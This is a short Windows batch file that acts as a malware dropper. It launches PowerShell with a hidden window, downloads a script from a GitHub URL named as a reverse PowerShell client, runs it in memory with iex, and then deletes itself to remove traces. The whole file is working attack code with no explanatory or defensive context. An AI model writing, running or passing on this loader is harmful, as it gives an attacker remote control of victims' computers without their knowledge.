@echo off
set scriptURL=https://raw.githubusercontent.com/PhantomControl/ReversePowershell/PhantomControl-patch-1/client.ps1
powershell -WindowStyle Hidden -nop -c "iex (New-Object Net.WebClient).DownloadString('%scriptURL%')"
del "%~f0"
